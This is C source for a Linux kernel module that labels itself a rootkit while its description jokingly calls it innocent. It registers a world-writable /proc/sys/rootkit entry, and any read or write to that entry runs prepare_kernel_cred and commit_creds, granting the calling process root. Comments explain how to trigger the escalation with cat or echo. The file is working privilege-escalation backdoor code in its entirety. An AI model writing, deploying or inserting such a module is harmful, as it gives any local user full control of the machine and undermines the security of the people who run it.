#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nobody important");
MODULE_DESCRIPTION("Totally innocent kernel module");
MODULE_VERSION("1.0");

#define log(...) printk(KERN_INFO "rootkit: " __VA_ARGS__)

// Grants the calling process root permissions
static int sysctl_escalate(void)
{
    struct cred *cred = prepare_kernel_cred(NULL);
    if (cred == NULL) {
        return -1;
    }
    return commit_creds(cred);
}

// Gets called when a read/write to the /proc/sys/rootkit
// file occurs.
//
// To test read: cat /proc/sys/rootkit
// To test write: echo "foo" > /proc/sys/rootkit
static int sysctl_handler(
    struct ctl_table *ctl,
    int write,
    void __user *buffer,
    size_t *lenp,
    loff_t *ppos)
{
    // After doing anything to the file, you should have
    // root permissions
    if (sysctl_escalate() < 0) {
        return -1;
    }

    log("len=%d, pos=%d\n", (int)*lenp, (int)*ppos);
    log("%s\n", (write) ? "write" : "read");
    return 0;
}

static struct ctl_table_header *ctl_hdr;

// Rootkit sysctl table entry
static struct ctl_table ctl_table[] = {
    {
        .procname = "rootkit",
        .data = NULL,
        .maxlen = 128,
        .mode = 0666,
        .child = NULL,
        .proc_handler = &sysctl_handler,
        .poll = NULL,
        .extra1 = NULL,
        .extra2 = NULL,
    },
    {}
};

// Called when the rootkit is loaded into the kernel
static int __init rootkit_init(void)
{
    ctl_hdr = register_sysctl_table(ctl_table);
    log("installed\n");
    return 0;
}

// Called when the rootkit is unloaded from the kernel
static void __exit rootkit_exit(void)
{
    unregister_sysctl_table(ctl_hdr);
    log("uninstalled\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
